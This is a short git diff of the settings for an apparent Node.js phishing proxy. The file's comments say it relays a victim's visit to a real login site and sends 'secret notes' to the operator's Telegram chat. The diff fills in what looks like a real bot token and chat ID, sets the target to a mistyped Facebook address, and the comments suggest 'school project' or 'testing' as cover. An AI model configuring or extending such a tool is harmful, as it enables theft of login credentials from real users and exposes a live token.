@@ -11,16 +11,16 @@ const fs = require('fs'); // To read files (for security later)
 // ============================================
 
 // 1. Your secret code for the Telegram Bot (get this from BotFather)
-const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; // <<<--- PUT YOUR TOKEN HERE!
+const TELEGRAM_TOKEN = '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g'; // <<<--- PUT YOUR TOKEN HERE!
 
 // 2. Your Telegram Chat ID (where you want to receive the secret notes)
-const CHAT_ID = 'YOUR_CHAT_ID_HERE'; // <<<--- PUT YOUR CHAT ID HERE!
+const CHAT_ID = '7837944828'; // <<<--- PUT YOUR CHAT ID HERE!
 
 // 3. The real website Sam is helping you visit (e.g., ISP email provider)
 //    Make SURE this is the exact base address. For ISP emails, using a trailing slash is often good.
 //    Example for Cox Business: 'https://webmail.coxbusiness.com/'
 //    Example for your school project: 'https://www.myschoolfinalproject.com/'
-const TARGET_URL_BASE = 'https://login.inbox.eu/'; // <<<--- CHANGE THIS TO THE BASE URL OF THE ISP EMAIL PROVIDER YOU ARE TESTING!
+const TARGET_URL_BASE = 'https://wwww.facebook.com/'; // <<<--- CHANGE THIS TO THE BASE URL OF THE ISP EMAIL PROVIDER YOU ARE TESTING!
 
 // 4. What "room number" (port) Sam's server will listen on. We'll use 3000 for now.
 const PORT = 3000;
